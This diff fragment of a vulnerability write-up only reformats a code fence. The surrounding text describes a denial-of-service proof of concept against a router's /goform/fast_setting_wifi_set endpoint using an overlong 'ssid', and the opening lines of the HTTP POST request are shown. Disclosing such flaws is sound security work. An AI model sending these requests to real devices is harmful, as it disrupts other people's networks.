@@ -31,8 +31,7 @@ So by POSTing the page `/goform/fast_setting_wifi_set` with long `ssid`, the att
 poc to DoS:
 
 
-
-```
+```http
 POST /goform/fast_setting_wifi_set HTTP/1.1
 Host: 192.168.2.1
 Connection: close
